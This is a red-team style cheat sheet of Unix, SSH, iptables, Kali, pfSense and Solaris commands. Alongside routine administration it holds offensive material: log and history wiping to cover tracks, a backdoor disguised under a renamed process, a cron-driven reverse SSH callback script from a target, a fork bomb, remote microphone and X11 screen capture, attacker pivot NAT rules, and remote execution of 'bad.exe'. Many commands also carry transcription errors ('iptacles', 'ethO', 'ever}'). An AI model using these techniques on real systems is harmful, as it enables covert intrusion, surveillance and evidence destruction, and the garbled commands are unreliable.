# *NIX

1. [Linux Networking](#linux-networking)
2. [Linux System Info](#linux-system-info)
3. [Linux Utility](#linux-utility)
4. [Linux File](#linux-file)
5. [Linux Misc](#linux-misc)
6. [Linux Cover Your Tracks](#linux-cover-your-tracks)
7. [SSH Tricks](#ssh-tricks)
8. [Linux Scripting](#linux-scripting)
9. [IPTables](#iptables)
10. [UPDATE-RC.D](#update-rc.d)
11. [CHKconfig](#chkconfig)
12. [X11](#x11)
13. [Kali](#kali)
14. [PFSense](#pfsense)
15. [SOLARIS](#solaris)

## Linux Networking  

```shell
#Network connections
watch ss -tp 
#Tcp connections -anu=udp
netstat -ant 
#Connections with PIDs
netstat -tulpn 
#Established connections
lsof -i 
#Access windows smb share
smb://<ip>/<share> 
#Mount Windows share
share user x.x.x.x c$ 
#SMB connect
smbclient -U user \\\\<ip>\\<share> 
#Set IP and netmask
ifconfig eth# <ip>/ cidr 
#Set virtual interface
ifconfig eth0:1 <ip>/ cidr 
#Set GW
route add default gw gw <ip> 
#Change MTU size
ifconfig eth# mtu [size] 
#Change MAC
export MAC=xx:xx:xx:xx:xx:xx 
#Change MAC
ifconfig int hw ether MAC 
#Backtrack MAC changer
macchanger -m MAC int 
#Built-in wifi scanner
iwlist int scan 
#Domain lookup for IP
dig -x <ip> 
#Domain lookup for IP
host <ip> 
#Domain SRV lookup
host -t SRV service tcp.url.com 
#DNS Zone Xfer
dig @<ip>domain -t AXrR 
#DNS Zone Xfer
host -1 domain namesvr 
#Print existing VPN keys
ip xfrm state list 
#Adds 'hidden' interface
ip addr add <ip>/ cidr aev ethO 
#List DHCP assignments
/var/log/messages | grep DHCP 
#Block ip:port
tcpkill host <ip> and port <port> 
#Turn on IP Forwarding
echo "1" /proc/sys/net/ipv4/ip forward 
#Add DNS Server
echo "nameserver x.x.x.x" /etc/resolv.conf 
#Print route table without dns lookup
arp -an 
#Trace route without dns lookup
traceroute -n <ip> 
#Prints routing table without dns lookup?????
netstat -rn 
```


##  Linux System Info  

```shell
#Get hostname for ip
nbtstat -A <ip> 
#Lists local NetBIOS names
nbtstat -name 
#Current username
id 
#Logged on users
w 
#User information
who -a 
#Last users logged on
last -a 
#Process listing (top)
ps -ef 
#Disk usage (free)
df -h 
#Kernel version/CPU info
uname -a 
#Mounted file Systems
mount 
#Show list of users
getent passwd 
#Add to PATH variable
PATH=$PATH:/home/mypath 
#Kills process with pid
kill <pid> 
#Show OS info
cat /etc/issue 
#Show OS version info
cat /etc/*release* 
#Show kernel info
cat /proc/version 
#Installed pkgs (Redhat)
rpm --query -all 
#Install RPM (-e=remove)
rpm -ivh *.rpm 
#Installed pkgs (Ubuntu)
dpkg -get-selections 
#Install DEB (-r=remove)
dpkg -I *.deb 
#Installed pkgs (Solaris)
pkginfo 
#Show location of executable
which <tscsh/csh/ksh/bash> 
#Disable shell , force bash
chmod 750 <tcsh/csh/ksh> 
```

##  Linux Utility  

```shell
#Grab url
wget http://<url> -O url.txt -o /dev/null 
wget https://8.8.8.8 --user-agent="Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:21.0) Gecko/20100101 Firefox/21.0" -O - -o /dev/null --no-check-certificate
#Remote Desktop to ip
rdesktop -u <username> -p <Password> -d <domain> -n Windows7 -f -g 1920x1080 clipboard:PRIMARYCLIPBOARD <ip> 
#Put file
scp /tmp/file user@x.x.x.x:/tmp/file 
#Get file
scp user@<remoteip>:/tmp/file /tmp/file 
#Add user
useradd -m user 
#Change user password
passwd <user> 
#Remove user
rmuser unarne 
#Record shell : Ctrl-D stops
script -a <outfile> 
#Find related command
apropos <subject> 
#View users command history
history 
# in history
!<num> #Executes line 
#Unpack a tar file bzip2(j)
tar -xvfj file.tar 
#Archive a gzip(z) file
tar -czvf <file>.tar.gz /original-file 
#Temporarily unencrypts to /tmp/cleartext
encfs /cryptdir /tmp/cleartext 
#Upgrades a nc shell to tty
python -c 'import pty;pty.spawn("/bin/bash")' 
#generates a 12 charater random password   
openssl rand -base64 12 
```


##  Linux File  

```shell
#Compare files
diff file1 file2 
#Force delete of dir
rm -rf <dir> 
#Overwrite/delete file
shred -f -u <file> 
#Matches ref_ file timestamp
touch -r <ref-file> <file> 
#Set file timestamp
touch -t YYYYMMDDHHSS <file> 
#List connected drives
fdisk -l 
#mount USB key
mount /dev/sda# /mnt/usbkey 
#Compute md5 hash
md5sum -t file 
#Generate md5 hash
echo -n "str" | md5sum 
#SHAl hash of file
shalsum file 
#Sort/show unique lines
sort -u 
#Count lines w/ ''str''
grep -c "str" file 
#Create .tar from files
tar cf file.tar files 
#Extract .tar
tar xf file.tar 
#Create .tar.gz
tar czf file.tar.gz files 
#Extract .tar.gz
tar xzf file.tar.gz 
#Create .tar.bz2
tar cjf file.tar.bz2 files 
#Extract .tar.bz2
tar xjf file.tar.bz2 
#Compress/rename file
gzip file 
#Decompress file.gz
gzip -d file.gz 
#UPX packs orig.exe
upx -9 -o out.exe orig.exe 
#Create zip
zip -r zipname.zip \Directory\* 
#Cut block 1K-3K from file
dd skip=1000 count=2000 bs=8 if=file of=file 
#Split file into 9K chunks
split -b 9K \<file> <prefix> 
#Win compatible txt file
awk 'sub("$"."\r")' unix.txt win.txt 
#Find PDF files
find -i -name <file> -type *.pdf 
#Search for setuid files
find / -perm -4000 -o -perm -2000 -exec ls -ldb {} \;
#Convert to *nix format
dos2unix <file> 
#Determine file type/info
file <file 
#Set/Unset immutable bit
chattr (+/-)i <file> 
```


##  Linux Misc  

```shell
### Disable history logging
unset HISTFILE 
#Record remote mic
ssh user@<ip> arecord - | aplay - 
#Compile C,C++
gcc -o outfile myfile.c 
#Reboot (0 = shutdown)
init 6 
#List of log files
cat /etc/*syslog*.conf | grep -v "^#" 
#Strip links in url.com
grep 'href=' file | cut -d"/" -f3 | grep <url> | sort -u 
#Make random 3MB file
dd if=/dev/urandom of=<file> bs=3145728 count=100 
```

##  Linux Cover Your Tracks 

```shell
### Clear auth.log file
echo "" > /var/log/auth.log 
#Clear current user bash history
echo "" > ~/.bash_history 
#Delete .bash_history file
rm ~/.bash history -rf 
#Clear current session history
history -c 
#Set historj max lines to 0
export HISTFILESIZE=0 
#Set histroy max commands to 0
export HISTSIZE=0 
#Disable history logging (need to logout to take effect)
unset HISTFILE 
#Kills current session
kill -9 $$ 
#Permanently send all bash history commands to /dev/null
ln /dev/null ~/.bash_history -sf 
#starts a back door renaming it to a common process
bash -c "exec -a <new name> <backdoor>" 
```


## SSH Tricks  

```shell
ssh root@1.1.1.1 -v -o "UserKnownHostsFile /dev/null" -o "StrictHostKeyChecking no" #SSH Masquerade
#SSH file transfer
cat localfile.txt | ssh user@<ip> " cat > file" 
#Creates a Control Socket at /tmp/sshtgt1
ssh -N -M -S /tmp/sshtgt1 user@1.1.1.1 
#Creates an interractive session on target using existing sockets.
ssh -S /tmp/sshtgt1 -O forward user@1.1.1.1 
#Createsssh server listening on a radom port ready for ssh tunnels 
/usr/sbin/sshd -D -p 2222 -q -o "AllowTCPForwarding yes" -o "GatewayPorts yes" 
#Port forwarding
ssh -L <local port>:127.0.0.1:<remote port> root@<remote ip> 						
```


##  Linux Scripting  

###  PING SWEEP

```shell
for x in {1..254..1};do ping -c 1 1.1.1.$x | grep "64 b" | cut -d" "-f4 >> ips.txt; done
```

###  AUTOMATED DOMAIN NAME RESOLVE BASH SCRIPT

```shell
#!/bin/bash
echo "Enter Class C Range: i.e. 192.168.3"
read range
for ip in {1..254..1};do
host $range.$ip | grep "name pointer" | cut -d" " -f5
done
```

### FORK BOMB (CREATES PROCESSES UNTIL SYSTEM "CRASHES")

```shell
:(){:|:&};:
```

### DNS REVERSE LOOKUP

```shell
for ip in {1..254..1}; do dig -x 1.1.1.$ip | grep $ip >> dns.txt; done;
```

### IP BANNING SCRIPT

```shell
#!/bin/sh
# This script bans any IP in the /24 subnet for 192.168.1.0 starting at 2
# It assumes 1 is the router and does not ban IPs .20, .21, .22
i=2
while [ $i -le 253 ]
do
	if [ $i -ne 20 -a $i -ne 21 -a $i -ne 22 ]; then
	echo "BANNED: arp -s 192.168.1.$i"
	arp -s 192.168.1.$i 00:00:00:00:00:0a
	else
	echo "IP NOT BANNED: 192.168.1.$i ***********"
	echo "***************************************" 
	fi
	i=`expr $i +1`
done 
```

### SSH CALLBACK

```shell
#Set up script in crontab to callback ever} X minutes. Highly recommend YOU
#set up a generic user on red team computer (with no shell privs). Script
#will use the private key (located on callback source computer) to connect
#to a public key (on red team computer). Red teamer connects to target via a
#local SSH session (in the example below, use #ssh -p4040 localhost)
#!/bin/sh
# Callback script located on callback source computer (target)
killall ssh > /dev/null 2>&1
sleep 5
REMLIS=4040
REMUSR=user
HOSTS="domain1.com domain2.com domain3.com"
for LIVEHOST in $HOSTS;
do
	COUNT=$(ping -c2 $LIVEHOST | grep 'received' | awk -F',' '{ print $2 }' | awk '{ print $1 }')
	if [[ $COUNT -gt 0 ]] ; then
		ssh -R ${REMLIS}:localhost:22 -i "/home/$(REMUSR}/.ssh/id_rsa" -N $(LIVEHOST} -l $(REMUSR}
fi
done
```


##  IPTables  
```shell
#Restore iptables rules
iptables-restore file 
#List all iptables rules with affected and line numbers
iptables -L -v --line-numbers 
#Flush all iptables rules
iptables -F 
#Change default policy for rules that don't match rules
iptables -P INPUT/FORWARD/OUTPUT ACCEPT/REJECT/DROP 
#Allow established connections on INPUT
iptables -A INPUT -i interface -m state -state RELATED,ESTABLISHED -j ACCEPT 
#Delete 7th inbound rule
iptables -D INPUT 7 
#Increase throughput by turning off statefulness
iptables -t raw -L -n 
#Drop all packets
iptables -P INPUT DROP 
```

###  Allow SSH on port 22 outbound

```shell
iptables -A OUTPUT -o iface -p tcp --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT
iptables -A INPUT -i iface -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT
```

### ALLOW ICMP OUTBOUND

```shell
iptacles -A OUTPUT -i iface -p icmp --icmp-type echo-request -j ACCEPT
iptables -A INPUT -o iface -p icmp --icmp-tjpe echo-reply -j ACCEPT
```

### PORT FORWARD

```shell
echo "1" > /proc/sys/net/lpv4/ip_forward

#OR#

sysctl net.ipv4.ip forward=1
```

```shell
iptables -t nat -A PREROUTING -p tcp -i eth0 -j DNAT -d <pivotip> --dport 443 -to-destination <attk-ip>:443
iptables -t nat -A POSTROUTING -p tcp -i eth0 -j SNAT -s <target subnet cidr> -d <attackip> --dport 443 -to-source <pivotip>
iptables -t filter -I FORWARD 1 -j ACCEPT
```

### ALLOW ONLY 1.1.1.0/24, PORTS 80,443 AND LOG DROPS TO /VAR/LOG/MESSAGES

```shell
iptables -A INPUT -s 1.1.1.0/24 -m state --state RELATED,ESTABLISHED,NEW -p tcp -m multipart --dports 80,443 -j ACCEPT
iptables -A INPUT -i ethO -m state --state RELATED,ESTABLISHED -j ACCEPT
iptables -P INPUT DROP
iptables -A OUTPUT -o eth0 -j ACCEPT
iptables -A INPUT -i lo -j ACCEPT
iptables -A OUTPUT -o lo -j ACCEPT
iptables -N LOGGING
iptables -A INPUT -j LOGGING
iptables -A LOGGING -m limit --limit 4/min -j LOG --log-prefix "DROPPED"
iptables -A LOGGING -j DROP
```


##  UPDATE-RC.D 

```shell
# Service starts at boot
service --status-all 
#Start a service
service <service> start 
#Stop a service
service <service> stop 
#Check status of a service
service <service> status 
#Remove a service start up cmd
update-rc.d -f <service> remove 
#Add a start up service
update-rc.d <service> defaults 
```


##  CHKconfig 
```shell
#List existing services and run status
chkconfig --list 
#Check single service status
chkconfig <service> -list 
#Add service [optional to add level at which service runs)
chkconfig <service> on [--level 3] 
#Remove service
chkconfig <service> off [--level 3] 
```


##  X11 

### Capture remote X11 window and convert to jpg

```shell
xwd -display <ip>:0 -root -out /tmp/test.xpm
xwud -in /tmp/test1.xpm
convert /tmp/test.xpm -resize 1280x1024 /tmp/test.jpg
```

### Open X11 stream viewing

### Read dumped file with xwudtopnm or GIMP
```shell
xwd -display 1.1.1.1:0 -root -silent -out x11dump 
```


## Kali

### WMIC EQUIVALENT
```shell
wmis -U DOMAIN\<user>%<password> //<DC> cmd.exe /c <command>
```

### MOUNT SMB SHARE

###  Mounts to /mnt/share. For other options besides ntlmssp, man mount.cifs
```shell
mount.cifs //<ip>/share /mnt/share -o user=<user>,pass=<pass>,sec=ntlmssp,domain=<domain>,rw 
```

### A very detailed remote SMB enumeration 
```shell
enum4linux <IP> 
```

```shell
#psexec but cleaner
/usr/share/doc/python-impacket/examples/psexec.py domain/user:'password'@<ip>   
```

### Executes Bad.exe on remote windows box.
```shell
winexe -U domain.name/username //ip C:\\windows\\bad.exe --system 
```


##  PFSense 

```shell
#pfSense Shell System
pfSsh.php 
#Allow all inbound WAN connections (adds to visible rules in WAN rules)
pfSsh.php playback enableallowallwan 
#Enable ssh inbound/outbound
pfSsh.php playback enablesshd 
#Show NAT rules
pfctl -sn 
#Show filter rules
pfctl -sr 
#Show all rules
pfctl -sa 
#Disables all rules
pfctl -d 
#Enables all rules
pfctl -e 
#Edit config
viconfig 
#Remove cached (backup) config after editing the current running
rm /tmp/config.cache 
#Reload entire config
/etc/rc.reload_all 
```


## SOLARIS 

```shell
#List of interfaces
ifconfig -a
# List of interface
netstat -in
#Route listing
ifconfig -r
#Start DHCP client
ifconfig ethO dhcp
#Set IP
ifconfig ethO plumb up <ip> netmask <nmask>
#Set gateway
route add default <ip>
#List users w/out passwords
logins -p
#List all services w/ status
svcs -a
#Process listing (top)
prstat -a
#Start SSH service
svcadm start ssh
#Enable telnet
inetadm -e telnet   (-d for disable)
#Total physical memory
prtconf | grep Memory
#Hard disk size
iostat -En
#Information on a binary
showrev -c /usr/bin/bash
#Restart system
shutdown -i6 -gO -y
#List clients connected NFS
dfmounts
#t1anagement GUI
smc
#Packet capture
snoop -d <int> -c <pkt #> -o results.pcap
#File system mount table
/etc/vfstab
# Login attempt log
/var/adm/logging
#Default settings
/etc/default/*
#Kernel modules & config
/etc/system
#Syslog location
/var/adm/messages
#Automounter config files
/etc/auto_*
#IPv4/IPv6 host file
/etc/inet/ipnodes
```

